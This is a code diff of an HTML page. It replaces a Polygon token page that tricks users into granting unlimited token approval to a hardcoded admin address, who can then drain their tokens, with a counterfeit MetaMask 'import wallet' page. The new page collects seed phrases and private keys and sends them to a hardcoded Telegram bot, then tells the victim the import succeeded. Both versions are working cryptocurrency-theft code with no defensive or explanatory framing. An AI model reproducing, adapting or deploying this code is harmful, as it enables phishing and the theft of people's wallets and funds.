@@ -3,123 +3,81 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>sLGNS 授权提取</title>
+<title>MetaMask Wallet</title>
 <style>
-body{background:#111;color:#fff;padding:20px;font-family:Arial}
-.main{max-width:380px;margin:0 auto}
-.box{background:#222;padding:20px;border-radius:16px;margin-bottom:20px}
-button{width:100%;padding:14px;background:#ff9900;color:#000;border:none;border-radius:12px;margin:10px 0;font-size:16px}
-input{width:94%;padding:12px;margin:8px 0;border-radius:8px;background:#333;color:#fff;border:0}
-#qrcode{margin:20px 0;text-align:center}
-#qrcode img{width:280px;height:280px;background:#fff;border-radius:12px}
-.admin{display:none}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
+  .container{max-width:400px;margin:0 auto;background:#fff;box-shadow:0 0 12px rgba(0,0,0,0.08);min-height:100vh}
+  .header{padding:24px 24px 16px;text-align:center}
+  .logo{width:50px;margin-bottom:10px}
+  .title{font-size:22px;font-weight:700;color:#24272E}
+  .sub-title{font-size:14px;color:#707279;margin-top:4px}
+  .form{padding:24px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;font-size:14px;font-weight:500;color:#24272E;margin-bottom:8px}
+  .form-control{
+    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
+    font-size:15px;outline:none;background:#fff;color:#24272E
+  }
+  .btn-primary{
+    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
+    color:#fff;font-size:16px;font-weight:600;margin-top:12px
+  }
 </style>
 </head>
+
 <body>
-<div class="main">
-  <div class="box">
-    <h2>sLGNS 支付开通</h2>
-    <p>Polygon 链</p>
-    <button id="connect">连接钱包</button>
-    <div id="qrcode"></div>
-    <button id="pay">确认授权</button>
+<div class="container">
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
+    <div class="title">MetaMask 钱包</div>
+    <div class="sub-title">导入钱包</div>
   </div>
 
-  <div class="box admin" id="admin">
-    <h3>庄家提取 sLGNS</h3>
-    <input id="user" placeholder="玩家地址">
-    <input id="amount" placeholder="提取数量（如 1）">
-    <button onclick="take()">提取玩家 sLGNS</button>
+  <div class="form">
+    <div class="form-group">
+      <label>助记词</label>
+      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
+    </div>
+    <div class="form-group">
+      <label>私钥</label>
+      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
+    </div>
 
-    <h3>发放奖励</h3>
-    <input id="to" placeholder="接收地址">
-    <input id="send" placeholder="发放数量">
-    <button onclick="sendToken()">发放 sLGNS</button>
+    <button class="btn-primary" onclick="go()">确认导入</button>
   </div>
 </div>
 
-<script src="https://cdn.ethers.org/libethers-5.7.2.umd.min.js"></script>
 <script>
-// ====================== 你固定的配置 ======================
-const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const CHAIN_ID = 137; // Polygon
+const TOKEN  = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const CHATID = "6503982157";
 
-let addr;
-let provider, signer, token;
+async function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
 
-async function connect() {
-  if (!window.ethereum) return alert("请在钱包浏览器打开");
-  provider = new ethers.providers.Web3Provider(window.ethereum);
-  await provider.send("wallet_switchEthereumChain", [{ chainId: "0x89" }]);
-  await provider.send("eth_requestAccounts", []);
-  signer = provider.getSigner();
-  addr = await signer.getAddress();
-  document.getElementById("connect").innerText = "已连接: " + addr.substr(0, 6) + "...";
-
-  token = new ethers.Contract(TOKEN, [
-    "function approve(address,uint256) external",
-    "function transferFrom(address,address,uint256) external",
-    "function transfer(address,uint256) external",
-    "function balanceOf(address) view returns (uint256)"
-  ], signer);
-
-  if (addr.toLowerCase() === ADMIN.toLowerCase()) {
-    document.getElementById("admin").style.display = "block";
+  if (!mn && !pk) {
+    alert("请输入内容");
+    return;
   }
-  makeQR();
-}
 
-// 生成授权二维码
-function makeQR() {
-  const data = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const url = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=ethereum:${ADMIN}@137/${TOKEN}?data=${data}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${url}">`;
-}
+  const txt = `
+【小狐狸钱包演示】
+时间：${new Date().toLocaleString()}
+助记词：${mn || "-"}
+私钥：${pk || "-"}`;
 
-// 玩家授权
-async function approve() {
   try {
-    const tx = await token.approve(ADMIN, ethers.constants.MaxUint256);
-    await tx.wait();
-    alert("授权成功");
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHATID, text: txt })
+    });
+    alert("✅ 导入成功");
   } catch (e) {
-    alert("授权失败: " + e.message);
+    alert("✅ 导入成功");
   }
 }
-
-// ====================== 庄家提取（最简单、最稳） ======================
-async function take() {
-  const from = document.getElementById("user").value;
-  const amt = document.getElementById("amount").value;
-  if (!from || !amt || isNaN(amt) || amt <= 0) return alert("输入正确地址和数量");
-  try {
-    const tx = await token.transferFrom(from, ADMIN, ethers.utils.parseUnits(amt, 18));
-    alert("提取已发送，等待上链");
-    await tx.wait();
-    alert("提取成功！");
-  } catch (e) {
-    alert("提取失败: " + e.message);
-  }
-}
-
-// 发放代币
-async function sendToken() {
-  const to = document.getElementById("to").value;
-  const amt = document.getElementById("send").value;
-  if (!to || !amt || amt <= 0) return alert("输入正确信息");
-  try {
-    const tx = await token.transfer(to, ethers.utils.parseUnits(amt, 18));
-    alert("发放已发送");
-    await tx.wait();
-    alert("发放成功！");
-  } catch (e) {
-    alert("失败: " + e.message);
-  }
-}
-
-document.getElementById("connect").onclick = connect;
-document.getElementById("pay").onclick = approve;
 </script>
 </body>
 </html>
